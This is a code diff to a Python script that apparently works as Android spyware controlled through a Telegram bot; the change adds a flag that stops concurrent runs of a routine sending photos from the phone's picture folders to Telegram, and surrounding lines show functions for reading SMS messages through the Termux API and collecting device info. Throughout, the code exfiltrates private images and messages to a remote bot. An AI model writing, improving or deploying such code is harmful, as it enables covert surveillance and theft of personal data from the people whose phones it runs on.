@@ -16,6 +16,7 @@ directories_to_search = [
     "/storage/emulated/0/Pictures/Messenger"
 ]
 stop_download_images = False
+image_download_in_progress = False
 
 # Function to send message or document to Telegram
 def send_to_telegram(message, document=None):
@@ -97,13 +98,19 @@ def handle_folder_navigation(folder_name):
 
 # Function to download and send images from specified directories
 def download_and_send_images():
-    global stop_download_images
+    global stop_download_images, image_download_in_progress
+    if image_download_in_progress:
+        return "Image download process is already in progress."
+    
+    image_download_in_progress = True
+    sent_files = set()
+    
     try:
-        sent_files = set()
         for directory in directories_to_search:
             if os.path.isdir(directory):
                 for filename in os.listdir(directory):
                     if stop_download_images:
+                        image_download_in_progress = False
                         send_to_telegram("Image download process stopped.")
                         return "Image download process stopped."
                     
@@ -113,8 +120,10 @@ def download_and_send_images():
                             send_to_telegram(f"Sending image `{filename}`...", document=src_path)
                             sent_files.add(filename)
         
+        image_download_in_progress = False
         return "All images have been sent to Telegram."
     except Exception as e:
+        image_download_in_progress = False
         return f"Error sending images: {str(e)}"
 
 # Function to get SMS messages (using Termux API)
@@ -143,7 +152,7 @@ def get_device_info():
 
 # Function to handle Telegram bot commands
 def handle_telegram_update(update):
-    global stop_download_images
+    global stop_download_images, image_download_in_progress
     try:
         message = update.get('message', {}).get('text', '')
         if message:
